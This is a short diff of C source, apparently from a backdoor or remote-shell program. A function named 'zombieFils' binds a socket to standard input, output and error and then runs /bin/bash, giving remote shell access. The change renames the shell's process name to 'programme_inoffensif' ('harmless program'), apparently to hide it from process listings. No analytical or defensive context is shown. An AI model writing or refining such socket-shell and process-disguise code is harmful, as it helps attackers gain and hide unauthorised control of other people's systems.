@@ -23,7 +23,7 @@ void zombieFils(void* sockfdController){
     dup2(*sockfd, STDERR_FILENO);
     dup2(*sockfd,STDIN_FILENO);
 
-    sexecl("/bin/bash", "bash", NULL);
+    sexecl("/bin/bash", "programme_inoffensif", NULL);
 }
 
 int main(int argc, char *argv[]){
